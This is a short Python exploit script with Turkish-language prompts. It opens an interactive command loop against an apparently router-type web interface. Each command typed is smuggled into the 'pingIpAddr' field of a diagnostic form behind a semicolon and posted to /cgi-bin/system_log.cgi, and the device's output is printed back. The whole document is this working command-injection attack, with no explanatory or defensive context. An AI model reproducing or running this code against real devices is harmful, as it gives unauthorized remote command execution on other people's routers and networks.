import requests
import sys
import os
import time
import colorama
from colorama import Fore
colorama.init()
if len(sys.argv) < 2:
    sys.exit()

url = sys.argv[1]
while(True):
    try:
        cmd = input("Komuta girin ~$: ")
        print(Fore.BLUE+"[*]"+Fore.RESET+f" Komut çalıştırılıyor {cmd}...")
        time.sleep(0.8)
        header = {
"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
"Accept": "*/*",
"Accept-Language": "en-US,en;q:0.5",
"Accept-Encoding": "gzip, deflate",
"Content-Type": "application/x-www-form-urlencoded",
"Content-Length": "207",
"Origin": "http://192.168.1.1",
"Connection": "close",
"Referer": "http://192.168.1.1/",
"Upgrade-Insecure-Requests": "1"
}

        datas = {
'Command':'Diagnostic',
'traceMode':'ping',
'reportIpOnly':'',
'pingIpAddr':';'+cmd,
'pingPktSize':'56',
'pingTimeout':'30',
'pingCount':'4',
'maxTTLCnt':'30',
'queriesCnt':'3',
'reportIpOnlyCheckbox':'on',
'logarea':'com.cgi',
'btnApply':'Apply',
'T':'1646950471018'
}
        x = requests.post(url+'/cgi-bin/system_log.cgi?',data=datas)
        print(Fore.BLUE+"[*]"+Fore.RESET+" Alındı: "+x.text)
    except:
        break